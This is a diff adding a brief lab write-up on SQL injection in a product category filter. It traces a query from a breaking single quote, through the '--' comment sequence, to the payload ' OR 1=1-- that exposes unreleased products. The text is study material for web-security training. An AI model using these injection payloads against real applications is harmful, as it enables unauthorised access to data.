@@ -1,0 +1,26 @@
+SQL injection vulnerability - Product category Filter
+
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1 
+
+End Goal:
+perform an SQL injection attack that causes the application to display
+details of all products in any category, both released and unreleased.
+
+Analysis:
+
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+SELECT * FROM products WHERE category = ''' AND released = 1
+# it gives an internal Server error
+# but now we want the application to work correctly instead of an error
+
+
+SELECT * FROM products WHERE category = ''--' AND released = 1
+# -- is a comment sequence in SQL so it ignores the rest of the query
+
+SELECT * FROM products WHERE category = ''
+
+SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
+# here OR 1=1 is used to to display all the unreleased products as well
+# because OR only needs only one of them to be True in order for 
+# whole to be True
